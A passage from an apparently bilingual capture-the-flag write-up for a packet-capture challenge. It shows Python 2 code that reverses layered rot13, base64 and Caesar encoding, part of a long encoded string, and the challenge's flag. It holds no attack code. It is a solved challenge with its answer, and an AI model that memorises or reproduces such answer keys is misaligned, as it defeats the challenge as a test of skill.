dGTFVURnpWbGR3UmxObFZUVkdWbGN4UjFSdldXRlRibmRYVW05emRWWkVSazluUms1NFZHOVNWMUp2YzFGV1Z6QXhVVEZhZGxaeFNsWmtNRFYyVlcxQ2VsWXhWbmRuUjNkclpVWnpZbGt3VlRWV01rcFpWWEZXWkZaalJsQldiVVpYWm5CT1IxVndiMnhTY1VKNVZtOW5OR1V5VVdKU2NVNXNVMFZ6Y2xSVVNsTldWbFowVkc1T1ZVMVdjMVpWVm10eVZHOWFkV1pFUmxwa01WcE1WbTVhUzFZeFoxVlNiMmRYVWxWellsWlVRbFpvUms1WFUzRk9aRkl5WVU5V2IxcDZWRVphZDJkR1oxcFdiMVkwVmtkM1YxVndSalpTYjFaV1pHNXpWRll4V2xabk1WWjFWSEJ6YkZJeFNsaFhWbFp5VlRGYVYxZHVaMWhrTWxKV1ZuQXhjbEV4YzFaWGJuZHRaVWhDUjFReFozSlViMDVHVTI1M1dGWkZXbGhaYlVwU2FFWmFXVnBHVGxkU1ZYTlZWMVpTVDFVeVRsZG1SbXR1VW5CU1VGVnRSbVJXTVhOR1ZtOW5WMUl3YzBkVWIyWTFWbkJLUjFkeGMxZFNZMFpVVm5CaFpGZFdjMGRYY0dGcmFHOWFUbFl5WVdSV01rMWlVbTluVkZkSFVuSlZiMnREVjBaYWRscEZPVTlXY0ZKV1ZURlNSMWR2V2xWU2JscGFaREZaTUZaVVFXRldNVTVWVW05elYwMHhTbFZXVkVaa1ZURmFkMU51V21SU2IwcFVWbTVXWkZadloxaE5WRUp0VFZWYVlsUldWbVJYUjBWalVXOXJWVlpXV210V1JWcGtWMGRTU1ZSdmExZGtNMEpJVjFkM2JtY3haMGhTV0d0dFVtOUthMVp2V2t0U1JsWjNhRVZ6YmsxRWIwWlZNbUZUVmpGS1ZtUXpaMWhXYjBwTFZHOWFaRkl4Vm5aa1JUbFhWMFZLV0Zad01XTk5WazVYVm5GU2JsTkZOVmxWY0RFMGFGWnZkVlp4VGxkU2NGSktWVmQzZGxkd1NrZFhjWE5WVm05elRGcEdXbnBTY0U1SFZYQnJUbVZGYzFsV2NIZGtWakpGWVZOdloxVmtNbUZ6VlhBMVExWldWblZXYm5OdlVtOXpWbFZYTVVkV01rcElaMFJTVjJWWVVtdFdjREZMWjBkV1NWUnZjMDVTYm5OUlZrZGhaR1F4U25abE0zTnJVak5DV0ZwWFlXUlRNV2QxVlc1S1QxSXhXbGhWTW1GWFZYQkdkVmR3UmxwbFdGSklWRzVhYmxaV1JuZFNiMUpUWkRKNlkxWndNWHBTTVZWaVVsaHZhMUp2V2xkVVZ6VlRaRVphZGxkdlRsZGxTRUpIVlRJeE5GVXhXblptUm05WFpERnphMVpVUmxObU1YTkdWM0JyVTFKdWMxQldiVUp1WlRBMVYxWllaMnRUUlRWeVZtMUJNVmRHV2toTldHZFlaVVp6TVZWWGQzcFdiMXAyWmtaQ1YxSXpUalJaTW1Ga1YxWnpSMVJ3YTA1bFJYTlRWbTVtWVUxSFRXRlViMnRXWkRKcmRGVnZWVEZXVmxwMlZXNW5UbFp2YnpWWk1GWkxWREZhZDA5VVRsZGxXRkY2VmpKMllXWXlUa1pYYjFwT1VtOXVlbGRVUm01VU1sSllVMjVhVDFZelVsaFdjREV6VFZaYVdHaEhkMDVTYm5Nd1ZuQTFWMVV5UldKa1JsSmFWak5TVEZWalJucFhSMUpIVkc5V1UyUXpRbGxXYm1jd1pqSktSMU51V2xoa00xSlhXVzlyVTJadldYcFdWRVp0WlZWelIxbHVaekJXTURGV1prVnZWMVl6UWtSVmJVWmtVakZTZFdWSGMxTldjVUpqVjFjeE1HY3hXblprTTJ0WFpESlNWVlJXV25wVFJscElhRWhPVmsxV2MxcFdWM2R1VmpKRllWZHhjMVpOVjFKWVZtMUtSMU5YU2tkVmIyZHNWbTVXTTFadldtUldNa2w2VGxWclUyVnVjMnRWYjJ0RFZsWmFkMmhJWjA5U2NVSlhWbkExVDFaR1duVm1Sbk5ZWkRGYVRGWlVRV0ZTTVVwMFZHOWFUbFl4U2tsWGJtYzBXVlphZGxkeFJsTmxSVFZ6VlhCaGVtaEdXbFZUYlVKUFVtNDFXRmxVVG01WlZrcFpVVzlXVmsxSFVUQldNVnBYWm05YWQwOVdTbXhTY1VKSVZtMUtNR1l4V2tkVFdITldaRzlhV0ZadVZtUm1iMWw2VjI0NWJVMVZOV0paTUZwdVZqRmFkV1pGWVZkV2IzTjBWRlphVDJZeFduaFViMVpyVFRGS1ZWZFhNREZSTURWSFprWmFXbWh2V2xCV2NERXdUVEZuZFdSSFJsZGxWVmt5Vlc5cmNsWndTbGxrUm10V1pWaE9ORlZ3WVc1bWNFNUhXa1UxYTAwd1NrVldiMUpEWkRGUllsSnZaMVZsUmxwVldWaHpWMlp2V25aVmJrNVBaVWRTVmxWWE5XNWxSbHAxVGxWeldtUXhjMFJXVkVaTFYwZEdSazlXWjA1V2IzTXhWMjVTUjJkd1ZrZFZjVlpYWlVaemNsUlhOVkpvYjFwWWFFZEdWRTFFUmxoWmJtdExWMGRGWTJSSVRsZGxXR3N6Vkc5YWVsWXlSa1phUm5OWFpETkNObFpYTVhwV01WcDJWMjluV0dRemEydFZjR0Y2Wm05elZsZHZaMjVTYjBwaldUQmFVMVV3TVVkbVJXdFhaVWRSZWxkV1ZURlNNVnAwVjI5V2EwMXZTbGxXVjNOQ1RWZE9SMVpZYTFaa01EVlZWbTFDWkUxR1VuWlhiMDVXWlVaelkxWXlNWEpXTVZwMlprWkNWbWh1V2xCYVJtZExVbTluZDFKd2EwNWxjR3RNVmpKM1pGbFhSV0ZVV0d0c1VtOXpUMVZ1Vmt0bVJtOVZVMjFTVWsxV1NsZFdjR0Z1VmtaS2RtWklhMVpsV0ZGNlZuQXhSMDV2U25abFJtZFRaVWhDVVZaWE1HRlRNazUyWlROelpGSnZjMDlWTUZaTFUwWmFXR1pGWjFWTlZuTklWa2RoVjFWd1NsbFJjR3RXWlVkU1VGUnVXbVJTTVZaMldrWk9UbEpGV1hwWGJsWlhUa1phU0ZOeFZsSldSVnBZVlc1V1MxWXhjMFZTY1VwdlpWVTFSMWx1VlRGVk1VbGpaRVp6VjFaalJUQlZNakZYVWpGbmVGWnZVbXROY1d0aFZuQmhVMll4VFdGbVJscHJVbkJTY2xsdVZucFNNVzkxVm5GblZVMVdjMWhXY0hOUFZsVXhXRlZ2VWxabFdHdFlXa1puUzFORk1WZFZiMnRUVFhCUlkxWXhXbE5STVZsaFZIRlNWbVZIWVZoWlZFNURWakZTVlZGd1JtNWxSbHBqV1ZWbU5WUnZXWHBYY1c5YVZrVTFkVlp1V2xwbk1XZDFaVVphVGxZeWF6WldjSE5MVkRGbldGSnVaMVpsUmtwVVZuQmhkV2hHV2xkWGIxcFBWbTQxWTFsdVduWmtWa2xpYUVaV1YyUXhXak5XUkVaa1ptOW5lRnBHV2s1U1JWcFlWa1phVjFsV1VuWlhiMmRZWlc5S1YxUldXa3RUUm05WWFFaEtiazFXV21KWmJscDZWRzlaWWxvemExZGxSa3BEV2tSS1VtaEdUbGxhUjBaVFpEQnpVVmRXVWtkWGJqRjJWMjlXVTJWSFVsUldjSFpoVG05V2QyaEhkMnRXTUhOSVZqSTFSMVl3TVZkWGIyZGtWbFp6WkZwWE1VZFNiMXAyVlc5blRsTkZTVEJXTVdaaFRrWlJlazFXWjFoa01YTlpXVlJPVTFaR1duWmFSemxUVFZoQ1dWUnZWbTVrUmtsNlRsWnpXbFpXV210V2JVcExabTlPZGxadldsZGxWMnRaVmxkelIxbFdaMGRWY1U1clVtNDFjbFJYWVV0V2IxcDJWVzVPVmsxVk5WaFdWMkZrWkZaT1IxZHZaMXBsV0d0clZtOWFkbWRGTlZsYVJUVlhaRE5CWVZaWE1ERlZNVloyVjI5clZtUXlVbXRXYlU1eVZVWlpZbWhHVGxkTlZrcGlWakpoWkZSdlowWlRiMmRZWkRGemExcEVSa3RuUmxwMldrWldhMDB5YTFaV2NIZFhVekpXUjJWR2EyNVNNRnBWVlhCaFMxZEdXa2huU0U1WFVtNDFTVnBWVm5aV2NFWjFWMjVoV21WWWEwdGFSRVo2VW5CS1NHWkdaMnhUUlVZMFZuQmhVMVF4U1dKVmIyZFZaREpoYTFWd1lVdFhSbEpWVVhGblZFMVdXbU5YYm10dVpVWktkbVpGYTFkU1kwWjVXVlpuUzFKd1RrWlViMmRyVFZaek1sWlVSbFpPVmxwMVQxWmFUbFp2U25OWlZFWjZVa1phVlZKd09XeE5ialZpVkZaclMxWndSV05SYjFwWFpYRkNXRlJXV25wWFJUVlhXa1pyVTJRelFsaFhWRUpUVWpGYWRVMVZhMVZrYmpWWVZXOW5VMDB4Vm5SU2JqbFlWakJ6U0ZaWFlVOWtWa3AyWmtoclYxZElRbEJWWTBaV2FGWldkVlp2V214bFYydFlWMVpTUzAwd01YWldXR2RXWkdOdlZGbHVXblpOTVZsaWFFVTViRkp2YzFwVlYzWXhWbTR4U0ZWdlFsZFdWbk5RVm0xR1QyWldTblptUlRWVFpETkNURlp1V21SWlZsRmhaVVpuV0dReWEzUlVWRXBUVmtaYWQyZElXbTVOVjJGV1ZWYzFUMVF4U25WT1ZtdGFWbGRyZFZadFJtUldNV2QwVW05YVRsWnhRazFXY0hka1ZERmFkbGR4U201U2IxcFlWbTVuTTAxR1duZG5SMFpWVFZWdk5WWkhOVmRrVmtwVlZtOXJWVlp3YTBSVk1tRlRWakZhVlZadlVrNWxSbk5ZVjFkM2JtWXhXa2hUYjFwWVZrVmFXRmxYZDB0b2IzTkdWMjQ1V0ZadmMySlhibHBrWkVkRllXWkdRbGRXTTJ0VVZWUkJNVll5U2tsVGNFWk9UVzlLVjFad1lXNWxNVXAyVm0xYVUyUmpiMWhaYmxaNmFGWnZWbFp4VGxWbFJuTllWakZTUTFkSFJuVlRjVXBXVFhGT05GVXhaMGRUVms1MlZHOU9WMDB5YTFGV2NEQjZaekF4Vms1WVRsUmxSMnR5Vlc5YWVsWkdVbGRXVkVaWVZtOWFNVmt3Vms5VWIxcDNhRVpyV2sxR1dtTlpWRVprWmpKT1NHUkdXazVsYjBwWlZtNWFaRlV4U25kU2JsWlRaVVp6VDFsWE1XTm5NVnAxVjNCM1UwMVdTbU5XY0dGa1pGWktSbGR2VWxwa01YTnJXVEZhWkZJeFduWmFSbEpYVFVSV1dWWnVaekJXTVZwSFUyOVdVMlF5YTFoVmNHRjZWVEZTVjFaVVJsZGxSMUpqVm5CaFQxVXhTbGRtUld0WVZqTnJWMVJ2V21SU01WSjJWbTlLYkdReGMzcFdWMkZ1WkRBMVIxZHVaMVpsUlRWVVZGWmFaRTFXYjNWWGNXZFdUVzV6TVZWWGMxTlpWbHBYVjNGdlpGSkZXbFJWTUdkUFUxZEtTR2hHWjFkTk1tdGFWbkJ6UzAxSFRXSldibXRVWlVaeldGbFhZV1JYUm05MlpFWk9VazFXV1RKV1J6VlBWakpLUm1WalNsZFNNMUpyV1ZablMxTldSblZvUm5OWFVsWnpVVlpYTUdGV01VNVlVMjVyVGxZelFsaFpWRWswYUVaYVdFMVVVbTVOVlRWSVZrZGhibFpYU25aWGIxWlhaVlJXUkZwV1dsZG1NVnAzWjBaV1RtUXhXV05YVjNkWFpqSkdkbE5ZYzFaa1kyOVlWbTFPY2xWR1VsZFhiamxYWlZVMVJsVndZV1JXTVZwMlprVXhXRlpGV25WWFZscFBabTR4Vm1SSGMxUlNWbk5oVmxkM1ZrMVdVV0ZYY1VwWFpWVmFWMVJWVWtkV01XOVdWbkJHYkZKdmMxZFdiMnR5VjI0eFYxZHhXbFpOY1d0aldUSmhlV2h2YzBobVJtZHNWakpyVFZadlVrZFpWMFZpVlc1clZXVnVjM0pWYmxwa1ZtOVNWbHBFVWxkU2IzTklWakl3TlZVeFduVk9WVnBXWlZocldGWnVXbVJtYjJkMlZtOWFhMlF3YzNKV1ZFSmtWVEpTU0ZWdVdtNVNiMHBQVkZjMWNsZFdaMVZTY0VaVlRWVTFZMVl5TlZOVU1WcEhVMjlTVjJReFdreFZiVVpXYUZVMVdWUnZVbE5rTTBKSVYxWldVMVV5UmxkVGIxcFlaRE5TYTFWd1lYcE5NV2RYV2taS2JrMXVjMGRaYmxwVFpGZEtkVk5VUWxkbFdFSlFWVlJHVm1oR1VuWmtSbHByYUc5YVdWWndZV1JaVmxwSFYxaHZiVkpYVWxOWmJscDZVMjlWWW1aR1oxWk5WbTgyVlZkM01GWnVNVWhrU0hOWFRVZFNVRnBHWjBkVFYwWkhXa1puVjJWdVNrMVdjSGRrVlRGRllWTllhMVZrTW10clZXOW5VMlpXV25aYVJ6bFBVbTl6TUZwRlZqQldSMHBIWlVSYVYyVllVak5XYm1kTFpqRm5WVkZ2YzA1bGIwb3lWMjlXWkZOd1VXRldiMjlrVWpOcldGWndOVU5UYjFwVlVtOWFiMUl4U2xoV1IyRnVWakpLUmxOdU9WWmxSbk5rVkZaYVZtaEdXbmRuUmxKWFpHTkZNbFp3TUdGTlIwWllVMjVuVkdSamIxaFVWVnBrWjFaelYxcEZXbTVOYjFwSFYyNWFUMVJ2V2xWUmJWWllWa1ZhVkZWVVJsTm1Na3BKVTI5YWEwMHhTbEZXY0RGalRWWlJZVlZ2YTA5V2NGSlZWWEIzZGs1R1dsaE5XR2RXWkdOR1JsVndZVk5YYmpGWFpraEtaRlp3VWxoV01GcFRaakZhZGxWdlRsZE5NbXRrVm01YWJrMUdXV0ZVV0c5VlpVZHJWVmx3TVhKV01XOTJWbFJHV0ZKdldtRlZWelZQVmtkS1IyWkdhMXBOUm5OVVZsZGhXbWh3UmtaYVIwWlhaVVp6TmxaSGQyNVRjRlozVW01YWJGSXlhM0phVjNka1ZqRmFTR2hIYzA1V2IwcGlWRlpXY21ReFRrZFRiMUpYVFVkU2VGUldXbnBXYjFwNFdrWm5WMlZHV1RCV2JVb3daakZTZDFKdFdsTmxSbk5YV1c5clExUkdWblpXV0d0WFpWWmFSMWx1WjBkVWIwcDRVVlJDVjFkSVFsQlpZMFp1VTBaU2VGVnZUbXhsVjJ0WlZsZGhiazVHV1dGWGJsWlVaVzQxVkZsdVZURlRWbWQxV1ROclYxSnVjMGRaTUZwWFZqSktXVlZ3YTFaTmNXdFVWbTFLVDFOR1NuWmFSbEpUWlVoQ1UxWnZaelJsTWsxaFUzRlNVMlZ1YzFsV01HZFRabFphZDJoSFJsUldjR0ZqVm5CaGJtUXhXblZtU0d0V1pWUkdTRlpIWVV0WFYwWkdaa1pyYTJRelFrMVdWRW8wVmpKU1YxZHhVbXRTTW1GelZXOWFlbFZHV2toblJscHVUVzlhV0ZVeVlYWmtiMDVJYUVaclZrMUdXbXRWVkVaWFowZFdSMVJ2WjFObFZrcFlWa1phWkZVeFZXRlhjVTVVWkc1YWExWndZV1JUUmxsaWFFVjNWMlZWV2tsWk1GcFBWRzlLZFdaRk1WZGxSa3BJV1dOR1QxWXlTa2RYYjJkc1VtOXpWVlp3ZDFkWlZUVkhWbGhuVjJWSFVsQldjSFl4VjFaVlltZEhPVmRTYm5OWldsVm1OVmR1TVhSV2NWcGFaVmhyYTFadFNrOVNNVloyVTI5bmJGSlhPR0ZXTW1GWFpUSk5ZVnBGWjFWbFIyRnpWVzFPUTFaR1VsVlJjVnBPVW5CU1lWVndNRFZXVjBZMlVXMU9WVTFYYTFSWlZ6RkxVbkJKWTJSR1oydGtNSEpqVm05U1IxVXhXV0ZhU0VwVlpVWktUMVp2VWxab1JscFZVbkJHVkUxV2MwaFdSMkZrVmpKR2RsTnhSbGRsUmxWaFZWUkdWbWN5UmtoUFYzTlhaVVZ6UjFadVp6QlRNa1pZVWxoclYyUnVOVlpVVmxwa2FHOVdkMDFXWjI1V2JuTmpWbGN4ZGxSdU1YZGtSa0pYWlZoQ1JGa3lNVmRXTVZaMlpVWm5hMDF4YTJ0V2NHRmtXVlpTZGxaeFNsZGxWRzlRVm5CaFIwNXZWbGRrUnpsWVpHTkdZbFl5YzBkV01WbzJVbGhuVjJReVVreFpZMFpQWm5CT1JrNVdUbGRsYmtwTFZuQjNVMUV5UldGVWNVcE9WbGRyZEZVd1ZtUm1WbTkzVFZjNVYxWnZjMkpXY0RWUFZrVXhkbE52YTFwTlJscHJWa2RoU21oV1ZuaFZiMXBYWlVaek1sZFdaelJUTWxKR1QxWm5WR1ZHV2xoWldITlhVMVpuZGxad1JsVk5Wa3BJVlRKaGRsbFdTblZUY0VaYVZrVnlNRlp1V2xab1JtZDNVbTlXYkZKdmNucFdNbmRrWmpGYVIxUnVhMVpsUmxwWFZGYzFVMDB4VW5WYVJtZFlWakJhU2xsVldsTldSa3AyWmtoclYxWXpVbGhaWTBaUFpqRmFXV1ZGT1ZkWFJVcFVWbkExZWxZd05VZFZiMnRQVmxaelQxbHVWVEZvYjFWaVRsYzVWMDFFUmtsV1YzWmhWMjR4VjJaSGEyUlNjRkpZVlhCaFpGZFdjMGRVYjJkWVVsVnpORlp0Um01TlIwbGlVbTVyVldReWEzUlZNRnBrVmpGdldXWkZTbTlTYjFvd1ZHOXJUMVZ3U2taT1dHOWFUVVpLV0ZaWFlXUldWMHBGVkc5YVRsSnZXVEJXVkVvMFZURlpZVlp2VmxOa1kyOVVWbkExUTFaV1drZFhiMmRQVW01elkxWndOVmRXTWtwMVYyOVNWbVZIVVRCWk1WcFdhRVphV1dSR1oxZFdSMkZYVm05blkwMVdVblZOV0VwUFZqQmFWMWx2YTFObWIxcEZVMjVhYmsxWFVtSmFWV2MwVmpKS1YxTlVSbGROVm5OWVZuQjJZVkl4VG5oVWIwNXJUVmhDVUZaWFlXUlpWazVYVjI5V1UyVllVbFZXY0RFMFYyOWFkMmhIZDFaTmJsWTFXbFZXTUZZeVJXRlhiMmRrVWtWYVVGWndNVWRTYjJkM2FFWm5iRlp1Y3pOV2IyWjZUVmRKWVZSeFRtUlNjR3RSVm5CaGVsWkdXblZYY1dkVVVtOXpXVlJXVWtOa01VcDFaa1p6V2xaWFRXRldNakZMWm05T2RXWkdaMU5sVmtwSlZsZHpSMWxXV25aWGNVNVhaVVpLV0ZZd1ZrdFNNVnBIVjI5blYyVldXa2hXTVd0eVYwZEtkMlJHVmxabFJrcElWakJhVm1jeFZuVlBWMkZUWlVoQ1NWZFhjMDlrTWtwSFYzRlNiMUpYVWxkWlYzZEdUVlpTZFZkdVoxZGxWWE5KV1c1bmNtUldUa1pUYmpGWFZqTnJWRlp0Umtwbk1ERlpWWEJ6VGsxdlNsVlhWM2RYWjNCUllWVnhUbGRsV0VKMldXOWFaRmRHWjNWV2NXZFZaVlZhWTFZeGEzSldjRXBaVVc1clYwMUdWalJaTW1Ga1pqRlNkMmhHWjFkU00ydElWbTlTUTFZd05VaFZibWRWWkRGYVUxbFVRbnBWUmxwMlYzRmFiMlZHYzFaVlYzWTFWVEpLUm1WRVRsVmxSMnRNVm01YWJsTldSblpXYjJkT1VtOXpNVmR2Vm1SWGNGWkhWbkZLWkZKdmMzTlpiMnR5VjFaYVdFMUVSbTVOYjFwSlZsWnJlbFZ2WjBsUmNVcFhaVVp6TTFVd1dtUm1NVnA0Vkc5blUyUXpRbGRXVm1jMFZUSkdSazFWYjFKV1JWcFlXVmQzZWxSR1ZsaE5WbWRVVW05S01GbFZaM3BWTWtWalVXMUdWMlZZUWtoYVJFWk9hRlpLV1dSR1dtdE5NVXBqVmxSQ1pGWXdNR0ZXV0d0WVpVVTFXRlZ3ZGpGWFZsSjJWM0JHYTJWR2MwaFdNbmQ2V1ZaWlkxVnZhMVZsV0d0VVZYQXhUMUpXVm5WT1ZtZFhUVEpPTkZadFJsTlNNa1ZpVm05clYyUXlVbFpaYm1keVZsWlZlbVJGU205U2NVSlhWbkJoYmxaRk1WaG5SRlpYVFhGU1kxWkhkbUZtYmpWWFpFWmFhMlF3YzJKV1Z6RmpUVmRPZDFOdVoxaGxSVFZZVkZSS2NsTkdaM1pXY0RsWFRWVTFTRlV5ZDFkVmNFVmpVWEZPV2xaRmNucFVibHAxYUVabmQyZEdjMWRXUlZwWlYxUkNjbFV4VldGWGJWcFRaVVZhVjFsWGQwdE5NVnBWVW05T1ZGSXdOVXBXY0dGa1ZqRmFkbVpHV2xka2JuSXdWbTFHVjFJeFRsbGFSbXRzVWxoQ1dGWkdaelJuTVUxaFprWm5aRkpVYjFWV2JVRXhVMFphU0dkRmQydFdNRmt5VlZkelYxbFdTblptUld0V1pWaHJVRlp0Um5wU1ZsWjJVMjluVjAxd2FqRldjREJoVFVkRllWUnZaMVZsUjFKWVdXOVdaRlpXVWxobU0ydFBaVVpXTlZSdmEwOVhSa3AzYUVSQ1ZVMVdTbFJXYmxwa1pqSk9SVlp3UmxkV01tdEpWbTFDYmxNeVVsZG1SRnBXWkdOV1ZGWndZWFZuTVZsaVRsaG5XbFp1TldOV1IzZGtWRzlaWTFGeFJscGxWRVo1Vkc1YVpHWXhXblpYY0dGVFpERnpXRlp1WnpCa01WVjZUVlZXYkZKVk5WZFVWelZ5VjBaU2RsZHZjMjlsUlRVd1dWVmFUMVl5U2tsUmNEbFlaVVp6ZVZWdFNrcG9WbEo0Vkc5YWJHVlhhMk5XVnpWNlZtNHhSMVp4VGxobFdGSjFXVzVhWkZZeGIzVlhiamxXVFc1elYxWXlOVWRXTVVwWFYxUkNWazF4YTB4V2NERlRVMVpuZDJoR1VsTldjVUpKVm05bU1XY3hVV0ZTY1VwT1UwZHJkRlZ3WVhwWlZsSldaRWM1VlZKeFFsZFpWV3RQVjBaS2RXWkZaMXBXVmxWaFZtNWFUMUp2VG5aWGIxWnNVbkZDVVZaWGMwSm9SMUpJVlc1YWExSXpRbk5aYjJkdVRrWmFWMWR2WjFOTlZuTllWbTlyY2xkSFJXSmtSbFpWVm05VllWWndZV1JTTVc1alpFWm5VMlZXU2t0V1ZFb3daekZhZFUxVmExWmtNbUZXVm05YVpGZEdXV0pvUlRsVFZtNWFNVmxWV21Sa1JURlpVVzlTV0dWR2MxUldSRVpMWjBaV1dWcEdUbXROY0d0VlYxWm5NRk14VFdGYVJtZFhWMGRyV0Zad01UQk9SbGxpVFZWblYxSXdjMWxXUjNOUFZuQktSMlpGWVZWbFJuTXpXVEl4UzFJeFduWlhialZUVFRKclVWWnVXbE5SY0ZaSFYzRk9WV1F4YzNKVmNHRkxWa1pTVm1SSE9WVlNjVUpYVmxkM2JsWkhSalpTYm1kYVpERnphMVpVUmt0WFIxWkZWVzluYTJRd2N6RlhibEpIVm5CV1YxZHhTbGhsUmtwVVZGZGhTMmN4V2xWUmNIZFRUVzlHTlZWd05VdFhSMHBIWmtaT1YyUXhjMnRWTUZwWFRtOU9kVTlXVW14U1dFSmtWMVpXYlUxV1dXSlRjVXBUWkc0MVYxUldaMU5UUm5ORlVuQkdWMlZGYzFwWk1GcFhWakZLVmxkWWMxZFNjRkY2Vm0xR1QyWXhXbGxrUjBaVVVqRktWbFp3YzBKTlZrNUhWMjVuV0dWRmMzWlZiMUpYVWpGU1ZtUklUbFpsUm5OSFZUSjNORmxXV25abVIydGFUWEZyVEZZeFowdFRSMDVIV2tVMVUxSldjMWRXYjJjMFdWWlJZV1ZHWjFWWFIyRldXVzlyVTFaR1duWmtSVXB2VW05Wk1sVlhOVXRrTURGMlYyOXJWMDF0Vm1OV2JsVmhVbTluZFZSdlowNWxiMFl6VjFabk5GVndVV0ZYY1VaWVpVaENUMWxVVGtOVGIxcFpaa1U1YlUxV2J6UldWMkZ1VlRKS1IxTnZaMXBXUlZvelZtNWFVMVp2Vm5WVWIxSlRaVVp6V1ZadVdsTlRNa1oyVTI5cmExSlViMWhaYjJ0VFpFWlZZVmR2VGxkTlZuTmlWMjVhYmxZeFdraGFNM05YVmpOQ1JGbGpSbTVTTWs1SlZIQnZUazF2U21GV1YzTlBVVEF3WVZkdlZsSmtNbEoxVm5CMk1WWXhibnBWYm1kc1VtNXpXRll5ZDNaV01VcEdaa2RyVmsxR1ZqUlZNV2RMVTBkS1NHVkZOVmRXUmxWNlZuQnpRMlJ1TVZkVVdHOVRWMGRTV1ZsWWMwZFdWbHAyV2tSU2JWSnZWalZhUldZMVZrZEtSMlZFVGxwa01tdFVWbTVhWkdadU5WWmtSbWRzVWpGS1RWZHVWbVJWTVVwM1UyNW5WV1ZYYTNKVVZWSlhVakZhVmxkdlNtNU5WVXBUVlVaUmVsQlJQVDA9'\n    decode(x)\n```\n\nOdkodowana wiadomość i flaga to: `flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}`.\n\n### ENG version\n\n> I was sniffing some web traffic for a while, I think i finally got something interesting. Help me find flag through all these packets.  \n> [net_756d631588cb0a400cc16d1848a5f0fb.pcap](transfer.pcap)\n\nWe load the downloaded file to Wireshark and after looking for a while on HTTP transmissions (menu File -> Export Objects -> HTTP) we find a source code:\n\n```python\nimport string\nimport random\nfrom base64 import b64encode, b64decode\n\nFLAG = 'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}'\n\nenc_ciphers = ['rot13', 'b64e', 'caesar']\n# dec_ciphers = ['rot13', 'b64d', 'caesard']\n\ndef rot13(s):\n\t_rot13 = string.maketrans( \n    \t\"ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz\", \n    \t\"NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm\")\n\treturn string.translate(s, _rot13)\n\ndef b64e(s):\n\treturn b64encode(s)\n\ndef caesar(plaintext, shift=3):\n    alphabet = string.ascii_lowercase\n    shifted_alphabet = alphabet[shift:] + alphabet[:shift]\n    table = string.maketrans(alphabet, shifted_alphabet)\n    return plaintext.translate(table)\n\ndef encode(pt, cnt=50):\n\ttmp = '2{}'.format(b64encode(pt))\n\tfor cnt in xrange(cnt):\n\t\tc = random.choice(enc_ciphers)\n\t\ti = enc_ciphers.index(c) + 1\n\t\t_tmp = globals()[c](tmp)\n\t\ttmp = '{}{}'.format(i, _tmp)\n\n\treturn tmp\n\nif __name__ == '__main__':\n\tprint encode(FLAG, cnt=?)\n```\n\nIn the same transmission (Follow TCP Stream option) there was also an encoded message.\n\nAfter reversing all the algorithms we get a decoding software:\n\n```python\nimport string\nimport random\nfrom base64 import b64encode, b64decode\n\nFLAG = 'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}'\n\n#enc_ciphers = ['rot13', 'b64e', 'caesar']\ndec_ciphers = ['rot13', 'b64d', 'caesard']\n\ndef rot13(s):\n\t_rot13 = string.maketrans( \n    \t\"ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz\", \n    \t\"NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm\")\n\treturn string.translate(s, _rot13)\n\ndef b64d(s):\n\treturn b64decode(s)\n\ndef caesard(plaintext, shift=-3):\n    alphabet = string.ascii_lowercase\n    shifted_alphabet = alphabet[shift:] + alphabet[:shift]\n    table = string.maketrans(alphabet, shifted_alphabet)\n    return plaintext.translate(table)\n\ndef encode(pt, cnt=50):\n\ttmp = '2{}'.format(b64encode(pt))\n\tfor cnt in xrange(cnt):\n\t\tc = random.choice(enc_ciphers)\n\t\ti = enc_ciphers.index(c) + 1\n\t\t_tmp = globals()[c](tmp)\n\t\ttmp = '{}{}'.format(i, _tmp)\n\n\treturn tmp\n\ndef decode(pt, cnt=61):\n    for i in xrange(cnt):\n        c = pt[0]\n        if c == '1':\n            pt = rot13(pt[1:])\n        if c == '2':\n            pt = b64d(pt[1:])\n        if c == '3':\n            pt = caesard(pt[1:])\n\n    print pt\n\nif __name__ == '__main__':\n    x = '2Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWmFkMDVWVGs1U2IyODFXa1ZuTUZadU1YVldiVkphVFVaS1dGWXlkbUZXTVdkMVprWnJWMlZHYzFsWGJscHVVekpOWVZaeFZsUmxWMnR5VkZabU5HaFdaM1pYY0hkdVRXOWFSMVJXYTA5V1YwcElhRVpTVm1WSGExUldWbHBrWm05dk5sSnZVbXhTVm5OWVZtNW1NV1l4V1dGVWJscFVaWEJoVjFsdVdtUm5iMUpYVjNGS2IxWlViMWhXVnpFd1YwWktkbVpGWVZkbFIxRXdWa1JHVDJZeFRuWlhjRzlUWlZkclkxWlhZVk5TYmpGSFZsaHJaRkpVYjFOWmJsVXhWakZTVjFkd09WaFNNRlkyVmxjMVIxWldXa1pUY0d0WFpVWnpZbHBYWVhwVFYwWkhWM0JyVG1Wd2EydFdjSE5MVFVkSllsWnVaMWRsYm5OWldWUk9VMlV4VWxkWGJuZFVWbTl6V0Zad2QyNWtWbHAxVGxabldsWldWV0ZXYmxwTFZqRk9kV1pHYTJ0a01YTlpWbGN4WTJoR1NsZGxNM05yVW00MVdGbFVUa05OVmxwWVprVk9iV1ZXUmpWV2NIZHlaRzlLV0doRk9WVldjRkpVVm5CaFZtaEdaM1ZuUm1kVFpHTldXRlp3TVhwVk1XZDNVMjl2Vm1ReVVsWldiMmRUVlVaV2RGSndkMjFsU0VKSFZHOWFibFV4V25oUmJqRlhWak5yV0ZSdVdsTldNVko0Vm05T2EwMXdhMVpXY0dGdVpURlJZVmR4VWs5V1ZUVllWWEIzWkZkR2JucFdjSGRYWlZWYVlsWXlkalZXY0VwSFYzRmFWV1ZHY3pOWk1tRlhabkJLU0dSRk5WZE5WWE5JVm05U1IxWXlUblZOVm1kVVpXNWFWVmxVUm1SVU1WbDZWbkZhVGxKd1VsbFpNRlp1VlhCS1JrNVZiMXBOUjJ0TVdWY3hTMmRIVmtaYVJtZHJaREJ6Y2xaVVJtUldjRlpJVTI1YVdHUmpWbFZWYjFwNlVtOWFWMWR2WjJ4bFZrWTFWWEExUzFkSFJXSmtSazVYWlZock0xbFZXbVJXTWtaSlZHOVdVMlF6UW1SWFYzZFhaekZaZWs